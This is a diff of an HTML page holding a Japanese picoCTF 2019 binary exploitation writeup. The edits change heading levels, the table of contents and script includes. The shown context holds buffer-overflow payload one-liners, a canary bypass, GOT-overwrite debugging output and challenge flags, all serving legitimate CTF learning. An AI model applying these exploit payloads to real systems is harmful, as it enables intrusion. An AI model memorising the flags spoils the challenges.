@@ -35,7 +35,7 @@
 
 
 <link href="https://captureamerica.github.io/writeups/dist/even.c2a46f00.min.css" rel="stylesheet">
-<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.css" integrity="sha256-7TyXnr2YU040zfSP+rEcz29ggW4j56/ujTPwjMzyqFY=" crossorigin="anonymous">
+
 
 
 <meta property="og:title" content="picoCTF 2019 Writeup (Binary Exploitation)" />
@@ -134,61 +134,75 @@
 
     <div class="post-toc" id="post-toc">
   <h2 class="post-toc-title">Contents</h2>
-  <div class="post-toc-content always-active">
+  <div class="post-toc-content">
     <nav id="TableOfContents">
   <ul>
-    <li><a href="#challenge">Challenge</a></li>
-    <li><a href="#solution">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge1">Challenge</a></li>
-    <li><a href="#solution1">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge2">Challenge</a></li>
-    <li><a href="#solution2">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge3">Challenge</a></li>
-    <li><a href="#solution3">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge4">Challenge</a></li>
-    <li><a href="#solution4">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge5">Challenge</a></li>
-    <li><a href="#solution5">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge6">Challenge</a></li>
-    <li><a href="#solution6">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge7">Challenge</a></li>
-    <li><a href="#solution7">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge8">Challenge</a></li>
-    <li><a href="#solution8">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge9">Challenge</a></li>
-    <li><a href="#solution9">Solution</a></li>
-  </ul>
-
-  <ul>
-    <li><a href="#challenge10">Challenge</a></li>
-    <li><a href="#solution10">Solution</a></li>
+    <li><a href="#binary-exploitation-handyshellcode-50-points">[Binary Exploitation]: handy-shellcode (50 points)</a>
+      <ul>
+        <li><a href="#challenge">Challenge</a></li>
+        <li><a href="#solution">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-overflow-1-150-points">[Binary Exploitation]: OverFlow 1 (150 points)</a>
+      <ul>
+        <li><a href="#challenge1">Challenge</a></li>
+        <li><a href="#solution1">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-newoverflow1-200-points">[Binary Exploitation]: NewOverFlow-1 (200 points)</a>
+      <ul>
+        <li><a href="#challenge2">Challenge</a></li>
+        <li><a href="#solution2">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-newoverflow2-250-points">[Binary Exploitation]: NewOverFlow-2 (250 points)</a>
+      <ul>
+        <li><a href="#challenge3">Challenge</a></li>
+        <li><a href="#solution3">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-overflow-2-250-points">[Binary Exploitation]: OverFlow 2 (250 points)</a>
+      <ul>
+        <li><a href="#challenge4">Challenge</a></li>
+        <li><a href="#solution4">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-canary-300-points">[Binary Exploitation]: CanaRy (300 points)</a>
+      <ul>
+        <li><a href="#challenge5">Challenge</a></li>
+        <li><a href="#solution5">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-messymalloc-300-points">[Binary Exploitation]: messy-malloc (300 points)</a>
+      <ul>
+        <li><a href="#challenge6">Challenge</a></li>
+        <li><a href="#solution6">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-stringzz-300-points">[Binary Exploitation]: stringzz (300 points)</a>
+      <ul>
+        <li><a href="#challenge7">Challenge</a></li>
+        <li><a href="#solution7">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-got-350-points">[Binary Exploitation]: GoT (350 points)</a>
+      <ul>
+        <li><a href="#challenge8">Challenge</a></li>
+        <li><a href="#solution8">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-pointy-350-points">[Binary Exploitation]: pointy (350 points)</a>
+      <ul>
+        <li><a href="#challenge9">Challenge</a></li>
+        <li><a href="#solution9">Solution</a></li>
+      </ul>
+    </li>
+    <li><a href="#binary-exploitation-seedspring-350-points">[Binary Exploitation]: seed-sPRiNG (350 points)</a>
+      <ul>
+        <li><a href="#challenge10">Challenge</a></li>
+        <li><a href="#solution10">Solution</a></li>
+      </ul>
+    </li>
   </ul>
 </nav>
   </div>
@@ -209,9 +223,9 @@
 <p><br /><br />
 Binary Exploitation の Writeupです。</p>
 <p><br /><br /></p>
-<h1 id="binary-exploitation-handyshellcode-50-points">[Binary Exploitation]: handy-shellcode (50 points)</h1>
+<h2 id="binary-exploitation-handyshellcode-50-points">[Binary Exploitation]: handy-shellcode (50 points)</h2>
 <hr>
-<h2 id="challenge">Challenge</h2>
+<h3 id="challenge">Challenge</h3>
 <blockquote>
 <p>This program executes any shellcode that you give it. Can you spawn a shell and use that to read the flag.txt?
 <br /><br />
@@ -223,7 +237,7 @@ Hint: You might be able to find some good shellcode online.</p>
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution">Solution</h2>
+<h3 id="solution">Solution</h3>
 <p>これは、picoCTF 2018のshellcodeと同じでした。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -248,9 +262,9 @@ Hint: You might be able to find some good shellcode online.</p>
 </div><p>Flag: <code>picoCTF{h4ndY_d4ndY_sh311c0d3_0b440487}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-overflow-1-150-points">[Binary Exploitation]: OverFlow 1 (150 points)</h1>
+<h2 id="binary-exploitation-overflow-1-150-points">[Binary Exploitation]: OverFlow 1 (150 points)</h2>
 <hr>
-<h2 id="challenge1">Challenge</h2>
+<h3 id="challenge1">Challenge</h3>
 <blockquote>
 <p>You beat the first overflow challenge. Now overflow the buffer and change the return address to the flag function in this program?
 <br /><br />
@@ -264,7 +278,7 @@ Hint: Make sure your address is in Little Endian.</p>
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution1">Solution</h2>
+<h3 id="solution1">Solution</h3>
 <p>offsetを求めて、飛びたい関数に飛ぶだけ。</p>
 <pre><code>$ (python -c 'print(&quot;A&quot;*76+&quot;\xE6\x85\x04\x08&quot;)' ; cat - ) | ./vuln
 Give me a string and lets see what happens: 
@@ -273,9 +287,9 @@ picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}
 </code></pre><p>Flag: <code>picoCTF{n0w_w3r3_ChaNg1ng_r3tURn57f5688e7}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-newoverflow1-200-points">[Binary Exploitation]: NewOverFlow-1 (200 points)</h1>
+<h2 id="binary-exploitation-newoverflow1-200-points">[Binary Exploitation]: NewOverFlow-1 (200 points)</h2>
 <hr>
-<h2 id="challenge2">Challenge</h2>
+<h3 id="challenge2">Challenge</h3>
 <blockquote>
 <p>Lets try moving to 64-bit, but don't worry we'll start easy. Overflow the buffer and change the return address to the flag function in this program.
 <br /><br />
@@ -287,7 +301,7 @@ Hint: Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes</p>
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution2">Solution</h2>
+<h3 id="solution2">Solution</h3>
 <p>picoCTFのサーバは、Ubuntu 18.04であるところがポイントです。16 byte alignmentしないと解けません。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -334,9 +348,9 @@ Hint: Now that we're in 64-bit, what used to be 4 bytes, now may be 8 bytes</p>
 </div><p>Flag: <code>picoCTF{th4t_w4snt_t00_d1ff3r3nt_r1ghT?_bfd48203}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-newoverflow2-250-points">[Binary Exploitation]: NewOverFlow-2 (250 points)</h1>
+<h2 id="binary-exploitation-newoverflow2-250-points">[Binary Exploitation]: NewOverFlow-2 (250 points)</h2>
 <hr>
-<h2 id="challenge3">Challenge</h2>
+<h3 id="challenge3">Challenge</h3>
 <blockquote>
 <p>Okay now lets try mainpulating arguments. program.
 <br /><br />
@@ -348,14 +362,14 @@ Hint: Arguments aren't stored on the stack anymore ;)</p>
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution3">Solution</h2>
+<h3 id="solution3">Solution</h3>
 <p>たぶん問題が間違っている気がします。win_fn1()とかいくつか関数が追加されているものの、flag()が残っているので、NewOverFlow-1と全く同じで解けます。</p>
 <p>Flag: <code>picoCTF{r0p_1t_d0nT_st0p_1t_e51a1ea0}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-overflow-2-250-points">[Binary Exploitation]: OverFlow 2 (250 points)</h1>
+<h2 id="binary-exploitation-overflow-2-250-points">[Binary Exploitation]: OverFlow 2 (250 points)</h2>
 <hr>
-<h2 id="challenge4">Challenge</h2>
+<h3 id="challenge4">Challenge</h3>
 <blockquote>
 <p>Now try overwriting arguments. Can you get the flag from this program?
 <br /><br />
@@ -367,7 +381,7 @@ Hint: GDB can print the stack after you send arguments</p>
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution4">Solution</h2>
+<h3 id="solution4">Solution</h3>
 <p>これはpicoCTF 2018のbof2とほぼ同じです。</p>
 <pre><code>$ (python -c 'print(&quot;A&quot;*188+&quot;\xe6\x85\x04\x08&quot;+&quot;BBBB&quot;+&quot;\xEF\xBE\xAD\xDE&quot;+&quot;\x0D\xD0\xDE\xC0&quot;)'; cat -) | ./vuln
 Please enter your string: 
@@ -376,9 +390,9 @@ picoCTF{arg5_and_r3turn55897b905}
 </code></pre><p>Flag: <code>picoCTF{arg5_and_r3turn55897b905}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-canary-300-points">[Binary Exploitation]: CanaRy (300 points)</h1>
+<h2 id="binary-exploitation-canary-300-points">[Binary Exploitation]: CanaRy (300 points)</h2>
 <hr>
-<h2 id="challenge5">Challenge</h2>
+<h3 id="challenge5">Challenge</h3>
 <blockquote>
 <p>This time we added a canary to detect buffer overflows. Can you still find a way to retreive the flag from this program located in /problems/canary_0_2aa953036679658ee5e0cc3e373aa8e0.
 <br /><br />
@@ -390,7 +404,7 @@ Hint: Maybe there's a smart way to brute-force the canary?</p>
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution5">Solution</h2>
+<h3 id="solution5">Solution</h3>
 <p>これはpicoCTF 2018のbof3とほぼ同じです。</p>
 <p>去年のどこかのWriteupにあったコードを流用させてもらって、canary (33xO) をゲット。</p>
 <pre><code>$ (python -c 'print(&quot;54\n&quot;+&quot;A&quot;*32+&quot;33xO&quot;+&quot;abcdefghijklmnop&quot; + &quot;\xed\x07&quot;)'; cat -) | ./vuln
@@ -400,9 +414,9 @@ picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}
 </code></pre><p>Flag: <code>picoCTF{cAnAr135_mU5t_b3_r4nd0m!_069c6f48}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-messymalloc-300-points">[Binary Exploitation]: messy-malloc (300 points)</h1>
+<h2 id="binary-exploitation-messymalloc-300-points">[Binary Exploitation]: messy-malloc (300 points)</h2>
 <hr>
-<h2 id="challenge6">Challenge</h2>
+<h3 id="challenge6">Challenge</h3>
 <blockquote>
 <p>Can you take advantage of misused malloc calls to leak the secret through this service and get the flag? Connect with nc 2019shell1.picoctf.com 21899.
 <br /><br />
@@ -414,7 +428,7 @@ Hint: If only the program used calloc to zero out the memory..</p>
 <li>auth.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution6">Solution</h2>
+<h3 id="solution6">Solution</h3>
 <p>GDBを使ってヒープがどうなるか見ながら解析しました。Ubuntu 18.04で解析したら、ちょっと動きが違ってました（うろ覚え）。</p>
 <p>あと、recvuntil()辺りが思ったように動かなくて Invalid option になっちゃったりしたので、よくわかんないけど Invalid になった際には再トライするようにして対処しました。</p>
 <div class="highlight"><div class="chroma">
@@ -532,9 +546,9 @@ Hint: If only the program used calloc to zero out the memory..</p>
 </div><p>Flag: <code>picoCTF{g0ttA_cl3aR_y0uR_m4110c3d_m3m0rY_ac0e0e6a}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-stringzz-300-points">[Binary Exploitation]: stringzz (300 points)</h1>
+<h2 id="binary-exploitation-stringzz-300-points">[Binary Exploitation]: stringzz (300 points)</h2>
 <hr>
-<h2 id="challenge7">Challenge</h2>
+<h3 id="challenge7">Challenge</h3>
 <blockquote>
 <p>Use a format string to pwn this program and get a flag.
 <br /><br />
@@ -546,7 +560,7 @@ Hint: <a href="http://www.cis.syr.edu/~wedu/Teaching/cis643/LectureNotes_New/For
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution7">Solution</h2>
+<h3 id="solution7">Solution</h3>
 <p>書式文字列攻撃の問題です。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -612,9 +626,9 @@ picoCTF{str1nG_CH3353_159c98a8}
 </code></pre><p>Flag: <code>picoCTF{str1nG_CH3353_159c98a8}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-got-350-points">[Binary Exploitation]: GoT (350 points)</h1>
+<h2 id="binary-exploitation-got-350-points">[Binary Exploitation]: GoT (350 points)</h2>
 <hr>
-<h2 id="challenge8">Challenge</h2>
+<h3 id="challenge8">Challenge</h3>
 <blockquote>
 <p>You can only change one address, here is the problem: program.
 <br /><br /></p>
@@ -632,7 +646,7 @@ picoCTF{str1nG_CH3353_159c98a8}
     NX:       NX enabled
     PIE:      No PIE (0x8048000)   &lt;---
 </code></pre><p><br /></p>
-<h2 id="solution8">Solution</h2>
+<h3 id="solution8">Solution</h3>
 <pre><code>gef➤  x win
 0x80485c6 &lt;win&gt;:	0x53e58955
 
@@ -666,9 +680,9 @@ picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}
 </code></pre><p>Flag: <code>picoCTF{A_s0ng_0f_1C3_and_f1r3_db12a9ed}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-pointy-350-points">[Binary Exploitation]: pointy (350 points)</h1>
+<h2 id="binary-exploitation-pointy-350-points">[Binary Exploitation]: pointy (350 points)</h2>
 <hr>
-<h2 id="challenge9">Challenge</h2>
+<h3 id="challenge9">Challenge</h3>
 <blockquote>
 <p>Exploit the function pointers in this program.
 <br /><br />
@@ -680,7 +694,7 @@ Hint : A function pointer can be used to call any function</p>
 <li>vuln.c</li>
 </ul>
 <p><br /></p>
-<h2 id="solution9">Solution</h2>
+<h3 id="solution9">Solution</h3>
 <p>2つ構造体が違うのに、同じポインタのリストを使っているところがポイント。</p>
 <div class="highlight"><div class="chroma">
 <table class="lntable"><tr><td class="lntd">
@@ -736,9 +750,9 @@ picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}
 </code></pre><p>Flag: <code>picoCTF{g1v1ng_d1R3Ct10n5_d9be6a30}</code></p>
 <p><br /><br />
 <br /><br /></p>
-<h1 id="binary-exploitation-seedspring-350-points">[Binary Exploitation]: seed-sPRiNG (350 points)</h1>
+<h2 id="binary-exploitation-seedspring-350-points">[Binary Exploitation]: seed-sPRiNG (350 points)</h2>
 <hr>
-<h2 id="challenge10">Challenge</h2>
+<h3 id="challenge10">Challenge</h3>
 <blockquote>
 <p>The most revolutionary game is finally available: seed sPRiNG is open right now! seed_spring. Connect to it with nc 2019shell1.picoctf.com 12269.
 <br /><br />
@@ -770,7 +784,7 @@ LEVEL (1/30)
 Guess the height: 2
 WRONG! Sorry, better luck next time!
 </code></pre><p><br /></p>
-<h2 id="solution10">Solution</h2>
+<h3 id="solution10">Solution</h3>
 <p>ランダムのシードをどこから取っているか、GDBとかGhidraとかで確認します。</p>
 <p>現在時間をベースにしているようです。</p>
 <p>以下は、Ghidraの結果をベースに書いたコードです。ほぼ、そのままですけど。</p>
@@ -917,7 +931,7 @@ WRONG! Sorry, better luck next time!
   
   <script src="https://cdn.jsdelivr.net/npm/jquery@3.2.1/dist/jquery.min.js" integrity="sha256-hwg4gsxgFZhOsEEamdOYGBf13FyQuiTwlAQgxVSNgt4=" crossorigin="anonymous"></script>
   <script src="https://cdn.jsdelivr.net/npm/slideout@1.0.1/dist/slideout.min.js" integrity="sha256-t+zJ/g8/KXIJMjSVQdnibt4dlaDxc9zXr/9oNPeWqdg=" crossorigin="anonymous"></script>
-  <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.1.20/dist/jquery.fancybox.min.js" integrity="sha256-XVLffZaxoWfGUEbdzuLi7pwaUJv1cecsQJQqGLe7axY=" crossorigin="anonymous"></script>
+  
 <script type="text/javascript" src="https://captureamerica.github.io/writeups/dist/even.26188efa.min.js"></script>
 
 
